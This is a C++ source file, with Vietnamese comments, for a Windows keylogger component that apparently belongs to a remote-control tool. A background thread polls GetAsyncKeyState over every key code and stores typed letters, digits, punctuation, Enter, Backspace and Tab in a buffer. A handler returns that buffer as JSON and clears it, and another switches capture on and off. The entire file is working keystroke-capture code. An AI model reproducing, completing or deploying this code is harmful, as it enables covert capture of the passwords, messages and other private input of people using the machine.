// controllers/KeylogController.cpp
#include "KeylogController.h"
#include "../utils/helpers.h"
#include <windows.h>
#include <mutex>
#include <atomic>
#include <thread>
#include <iostream>

using namespace std;

// --- State (trang thai) rieng cua Keylogger (static) ---
static string keylogBuffer = "";
static mutex logMutex;
static atomic<bool> keylogEnabled(false);

/**
 * @brief Ham chay trong luong rieng biet de bat ban phim.
 */
static void KeyLogger()
{
    cout << "[SYSTEM] KeyLogger Thread da khoi dong." << endl;
    while (true)
    {
        Sleep(10); 
        bool isEnabled = keylogEnabled.load();

        for (int i = 1; i < 256; i++)
        {
            short keyState = GetAsyncKeyState(i);
            if (!isEnabled) {
                continue;
            }

            if (keyState == -32767)
            {
                lock_guard<mutex> lock(logMutex);
                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL) & 0x0001);
                
                if (i >= 65 && i <= 90)
                    keylogBuffer += shift ? (char)i : (char)(i + 32);
                else if (i >= 48 && i <= 57)
                {
                    string s = ")!@#$%^&*(";
                    keylogBuffer += shift ? s[i - 48] : (char)i;
                }
                else if (i == VK_SPACE)
                    keylogBuffer += " ";
                else if (i == VK_RETURN)
                    keylogBuffer += "\n[ENTER]\n";
                else if (i == VK_BACK)
                    keylogBuffer += "[BS]";
                else if (i == VK_TAB)
                    keylogBuffer += "[TAB]";
                else if (i == VK_OEM_PERIOD)
                    keylogBuffer += shift ? ">" : ".";
            }
        }
    }
}

// --- Public Handlers ---

void KeylogController::startKeyLoggerThread()
{
    thread(KeyLogger).detach();
}

string KeylogController::getKeylog()
{
    lock_guard<mutex> lock(logMutex);
    string safeLog = jsonEscape(keylogBuffer);
    
    // Tra ve JSON status
    string json = "{\"log\":\"" + safeLog + "\", \"enabled\":" + (keylogEnabled.load() ? "true" : "false") + "}";
    keylogBuffer = "";
    return json;
}

void KeylogController::setKeylog(bool enabled)
{
    cout << "[CMD] Doi trang thai Keylog: " << (enabled ? "BAT" : "TAT") << endl;

    if (!enabled) {
        lock_guard<mutex> lock(logMutex);
        keylogBuffer = "";
        
        // XOA HET TRANG THAI PHIM
        cout << "[CMD] Dang xoa trang thai tat ca phim..." << endl;
        for (int i = 0; i < 3; i++) {
            for (int key = 1; key < 256; key++) {
                GetAsyncKeyState(key);
            }
            Sleep(10);
        }
        cout << "[CMD] Da xoa xong trang thai phim." << endl;
    }
    
    keylogEnabled.store(enabled);
}